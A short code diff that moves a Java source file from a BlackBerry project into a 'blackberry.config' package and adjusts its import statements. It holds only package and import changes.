@@ -7,7 +7,7 @@
  * Created      : 26-mar-2010
  * *************************************************/
 
-package blackberry;
+package blackberry.config;
 
 import java.io.EOFException;
 import java.io.IOException;
@@ -15,10 +15,11 @@ import java.io.InputStream;
 
 import net.rim.device.api.util.Arrays;
 import net.rim.device.api.util.DataBuffer;
+import blackberry.Common;
+import blackberry.Status;
 import blackberry.action.Action;
 import blackberry.agent.Agent;
 import blackberry.config.InstanceConfig;
-import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
